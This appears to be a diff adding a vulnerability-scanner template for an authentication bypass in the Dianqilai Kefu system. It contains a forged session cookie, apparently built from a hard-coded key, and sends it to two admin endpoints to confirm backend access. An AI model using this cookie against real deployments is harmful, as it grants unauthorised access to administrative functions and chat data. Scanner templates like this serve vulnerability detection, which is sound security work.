@@ -1,0 +1,44 @@
+id: dianqilai-cookie-auth-bypass
+info:
+  name: Dianqilai Kefu System Cookie Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Dianqilai Kefu system can forge the system session based on the service_id due to the hard-coded session encrypted KEY, allowing attackers to bypass permission verification and gain backend access.
+  reference:
+    - https://mp.weixin.qq.com/s/-LnDOjoqYMjtjoVV9l-EuA
+  tags: permission-bypass
+
+variables:
+  cookies: "service_token=OuwfoovK%2BIdd"
+
+http:
+  - name: check-group-permissions
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/custom/index.html"
+    headers:
+      Cookie: "{{cookies}}"
+      X-Requested-With: XMLHttpRequest
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "data.message.groupid"
+          - "business_id"
+
+  - name: check-chat-permissions
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/set/getchats"
+    headers:
+      Cookie: "{{cookies}}"
+      X-Requested-With: XMLHttpRequest
+    matchers:
+      - type: status
+        status:
+          - 200
